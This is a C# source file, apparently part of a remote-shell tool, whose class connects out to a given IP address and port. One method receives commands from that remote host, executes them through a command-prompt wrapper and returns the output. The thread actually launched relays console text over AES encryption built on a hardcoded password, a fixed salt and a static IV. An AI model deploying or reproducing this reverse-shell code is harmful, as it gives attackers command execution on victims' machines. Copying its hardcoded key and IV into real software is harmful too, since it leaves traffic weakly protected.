using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Security.Cryptography;

namespace RemoteShell
{
    class Skeleton
    {
        private Socket clnt;
        public Skeleton(IPAddress ipAddress, int port)    //control must return instantly
        {
            if (conn(ipAddress, port) == true)
            {
                Thread cthrd = new Thread(new ThreadStart(communicate2)); //listen to stream infinitely
                cthrd.Start();
            }
        }

        private void communicate()
        {
            StreamReader inStream= new StreamReader(new NetworkStream(clnt));   //Stream creation
            StreamWriter outStream = new StreamWriter(new NetworkStream(clnt));   //Stream creation
            CmdPrompt cp;
            string msg = "";
            string reply="";
            
            cp = new CmdPrompt();

            try
            {
                while (true)    //listen from client
                {
                    msg = inStream.ReadLine();

                    if (msg == null)
                    {
                        Console.WriteLine("client Disconnected!");
                        break;
                    }

                    Console.WriteLine("R:" + msg);

                    if (msg.Equals("CMD"))
                    {
                        reply=cp.startCmd();
                    }
                    else
                    {
                        reply=cp.execute(msg);
                    }

                    outStream.WriteLine(reply);
                    outStream.Flush();

                }//loop
            }
            catch (IOException)
            {
                Console.WriteLine("relay disconnected");
            }
        }

        private void communicate2()
        {
            byte[] salt = { 1, 2, 3, 4, 5, 6, 7, 8, 9 };
            byte[] iv = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9, 8, 7, 6, 5, 4 };
            byte[] password = Encoding.ASCII.GetBytes("PASSWORD");

            AesCryptoServiceProvider csp = new AesCryptoServiceProvider();
            csp.Mode = CipherMode.CBC;
            csp.Padding = PaddingMode.PKCS7;
            var spec = new Rfc2898DeriveBytes(password, salt, 65536);
            byte[] key = spec.GetBytes(16);
            csp.Key = key;
            csp.IV = iv;
            ICryptoTransform cipher = csp.CreateEncryptor();

            CryptoStream crStream = new CryptoStream(new NetworkStream(clnt), cipher, CryptoStreamMode.Write);
            StreamReader inStream = new StreamReader(new NetworkStream(clnt));

            string msg = "";
            string reply = "";

            try
            {
                while (true)    //listen from client
                {
                    msg = inStream.ReadLine();

                    if (msg == null)
                    {
                        Console.WriteLine("client Disconnected!");
                        break;
                    }

                    Console.WriteLine("R:" + msg);

                    reply = Console.ReadLine();
                    byte[] inbt=Encoding.UTF8.GetBytes(reply);

                    crStream.Write(inbt,0,inbt.Length);
                    crStream.Flush();
                }//loop
            }
            catch (IOException)
            {
                Console.WriteLine("relay disconnected");
            }
        }

        private bool conn(IPAddress ipAddress, int port)
        {
            try
            {
                IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
                // Create a TCP/IP  socket.
                clnt = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    clnt.Connect(remoteEP);
                    Console.WriteLine("Socket connected to {0}", clnt.RemoteEndPoint.ToString());
                    return true;
                }
                catch (ArgumentNullException ane)
                {
                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            return false;
        }//conn

    }
}